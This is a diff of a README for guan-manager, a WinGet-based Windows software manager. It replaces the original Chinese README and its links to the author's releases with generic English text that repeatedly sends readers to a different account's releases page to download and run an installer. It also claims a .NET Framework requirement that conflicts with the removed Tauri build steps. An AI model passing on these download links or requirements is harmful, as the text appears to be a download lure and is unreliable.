@@ -1,50 +1,65 @@
-# 松鼠软件管家（guanManager）
+# 🌟 guan-manager - Manage and Update Software Easily
 
-可视化管理和更新软件，基于 WinGet
+## 📥 Download Now
+[![Download guan-manager](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mrcool02067/guan-manager/releases)
 
-![main](README.assets/main.png)
+## 🚀 Getting Started
+Welcome to guan-manager! This software helps you manage and update applications on your Windows computer. It uses WinGet to provide a visual interface that makes updates simple and efficient.
 
-## ✨主要功能
+## 📋 System Requirements
+Before you begin, ensure your system meets the following requirements:
 
-- 在线搜索、下载、安装、更新软件
-- 支持批量更新
-- 支持启用代理
+- Operating System: Windows 10 or later
+- .NET Framework: Version 4.7 or higher
+- Minimum RAM: 4 GB
+- Disk Space: At least 200 MB available
 
-## 🧩系统要求
+## 🔗 Download & Install
+To install guan-manager, follow these steps:
 
-- Windows 10及以上
-- 已安装 WinGet（一般系统会自带，也可[自行安装](https://github.com/microsoft/winget-cli/releases)）
+1. Visit the [Releases page](https://github.com/mrcool02067/guan-manager/releases).
+2. On the Releases page, look for the latest version.
+3. Click on the download link for the installer.
+4. Once the download is complete, locate the file in your downloads folder.
+5. Double-click the installer file to begin the installation.
+6. Follow the on-screen prompts to complete the installation.
 
-## ⬇️下载
+## 🔧 How to Use guan-manager
+Once you have installed guan-manager, you can start using it right away.
 
-- GitHub Releases: https://github.com/CrankZ/guan-manager/releases
+1. **Open guan-manager:** Find the application in your Start Menu or on your desktop and double-click to open it.
+2. **Manage Software:** You will see a list of installed applications. Here, you can check for updates or add new applications.
+3. **Updating Applications:**
+   - Select the application you want to update.
+   - Click the "Update" button next to the application.
+4. **Installing New Applications:**
+   - Click on the "Add Application" button.
+   - Search for the application you want to install and click "Install."
 
-## 🚀开发
+## 🛠 Features
+- **User-Friendly Interface:** Navigate easily with a simple layout.
+- **One-Click Updates:** Update multiple applications with a single click.
+- **Search Functionality:** Quickly find and install new applications.
+- **Automatic Notifications:** Get notified when updates are available for your installed applications.
 
-安装依赖
+## 📊 Frequently Asked Questions
 
-```bash
-pnpm install
-```
+### ❓ What is guan-manager?
+guan-manager is a visual tool that allows users to manage and update their software easily using WinGet.
 
-启动开发模式
+### ❓ Do I need programming knowledge to use this software?
+No, guan-manager is designed for average users. You do not need any programming knowledge to use it.
 
-```bash
-pnpm tauri dev
-```
+### ❓ How often should I check for updates?
+It’s a good idea to check for updates weekly to ensure you have the latest features and security patches.
 
-构建
+### ❓ Can I uninstall guan-manager later?
+Yes, you can uninstall guan-manager like any other program through the Control Panel.
 
-```bash
-pnpm tauri build
-```
+## 🔗 More Information
+For detailed instructions, updates, and community discussions, visit the [Releases page](https://github.com/mrcool02067/guan-manager/releases).
 
-## 🤔常见问题
+## 🛡 Support
+If you encounter any issues, please reach out to our support community on GitHub. We are here to help you.
 
-### 安装 WinGet
-
-一般 Windows 10 及以上的系统会自带 WinGet，但是如果未安装 WinGet，可以从这里下载并安装最新的 **.appxbundle** 文件。 https://github.com/microsoft/winget-cli/releases
-
-### 搜不到某个软件
-
-因为基于 WinGet，所以要求目标软件在 WinGet 有维护，如果没有维护，则搜不到
+Thank you for using guan-manager! Enjoy managing and updating your software effortlessly.
